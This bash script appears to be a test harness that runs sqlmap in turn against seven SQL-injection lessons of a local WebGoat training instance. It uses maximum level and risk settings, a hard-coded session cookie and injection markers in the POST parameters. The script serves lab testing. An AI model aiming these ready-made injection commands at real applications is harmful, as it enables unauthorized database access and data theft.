#!/bin/bash

# Requires WebGoat:
# docker run -d --name webgoat --rm -p 8080:8080 webgoat/webgoat-7.1

# Minor setup so Ctrl+C quits the whole script, not just the currently-running sqlmap instance
function handle_trap {
    exit 1
}

trap handle_trap SIGINT

# Utilities
function print_value {
    echo "Using $1 = ${!1}"
}

DATE_PREFIX=$(date +'%Y-%m-%d.%H-%M')

LOG_PREFIX="logs-webgoat/$DATE_PREFIX"
print_value "LOG_PREFIX"
mkdir -p $LOG_PREFIX

XML_PREFIX="output-webgoat/$DATE_PREFIX"
mkdir -p $XML_PREFIX

#
# Parameters
#
CODEDX_EXPORT=0
TARGET="http://minikube.local:8080/WebGoat"
SESSIONID="F251BEB224B0C55BAD20D3D0CF7A1BD3"

# Internal vars and logging
SQLMAP_COOKIE="--cookie=\"JSESSIONID=$SESSIONID\""

print_value "TARGET"
print_value "SESSIONID"
print_value "SQLMAP_COOKIE"

SQLMAP_PATH="../../sqlmap.py"
SQLMAP_COMMON="--fresh-queries --batch --dbms=HSQLDB  --level=5 --risk=3 --drop-set-cookie --safe-url \"$TARGET/service/restartlesson.mvc\" --safe-freq 1 --flush-session"
print_value "SQLMAP_COMMON"

function SQLMAP_CODEDX {
    if [ ! $CODEDX_EXPORT ]
    then
        echo ""
    else
        echo "--codedx $XML_PREFIX/export-$1.xml"
    fi
}

# Show expanded commands as they're ran so we can repro any issues manually by
# copying/pasting from shell output
set -x

# Run sqlmap

NAME="1-numeric-sql-injection"
python $SQLMAP_PATH \
    $SQLMAP_COMMON $SQLMAP_COOKIE \
    -u "$TARGET/attack?Screen=101829144&menu=1100" \
    --data="station=102*&SUBMIT=Go!" \
    $(SQLMAP_CODEDX "$NAME") \
    2>&1 | tee "$LOG_PREFIX/log-$NAME.txt"

NAME="2-string-sql-injection.txt"
python $SQLMAP_PATH \
    $SQLMAP_COMMON $SQLMAP_COOKIE \
    -u "$TARGET/attack?Screen=538385464&menu=1100" \
    --data="account_name=Smith*&SUBMIT=Go!" \
    $(SQLMAP_CODEDX "$NAME") \
    2>&1 | tee "$LOG_PREFIX/log-$NAME.txt"

NAME="3-lab1-string-sql-injection.txt"
python $SQLMAP_PATH \
    $SQLMAP_COMMON $SQLMAP_COOKIE \
    -u "$TARGET/attack?Screen=1537271095&menu=1100&stage=1" \
    --data="employee_id=103*&password=x*&action=Login" \
    $(SQLMAP_CODEDX "$NAME") \
    2>&1 | tee "$LOG_PREFIX/log-$NAME.txt"

NAME="4-lab3-numeric-sql-injection.txt"
python $SQLMAP_PATH \
    $SQLMAP_COMMON $SQLMAP_COOKIE \
    -u "$TARGET/attack?Screen=1537271095&menu=1100&stage=3" \
    --data="employee_id=101*&password=x*&action=Login" \
    $(SQLMAP_CODEDX "$NAME") \
    2>&1 | tee "$LOG_PREFIX/log-$NAME.txt"

NAME="5-database-backdoors.txt"
python $SQLMAP_PATH \
    $SQLMAP_COMMON $SQLMAP_COOKIE \
    -u "$TARGET/attack?Screen=980912706&menu=1100" \
    --data="username=x*&Submit=Submit" \
    $(SQLMAP_CODEDX "$NAME") \
    2>&1 | tee "$LOG_PREFIX/log-$NAME.txt"

NAME="6-blind-numeric-sql-injection.txt"
python $SQLMAP_PATH \
    $SQLMAP_COMMON $SQLMAP_COOKIE \
    -u "$TARGET/attack?Screen=586116895&menu=1100" \
    --data="account_number=101*&SUBMIT=Go!" \
    $(SQLMAP_CODEDX "$NAME") \
    2>&1 | tee "$LOG_PREFIX/log-$NAME.txt"

NAME="7-blind-string-sql-injection.txt"
python $SQLMAP_PATH \
    $SQLMAP_COMMON $SQLMAP_COOKIE \
    -u "$TARGET/attack?Screen=1315528047&menu=1100" \
    --data="account_number=101*&SUBMIT=Go!" \
    $(SQLMAP_CODEDX "$NAME") \
    2>&1 | tee "$LOG_PREFIX/log-$NAME.txt"

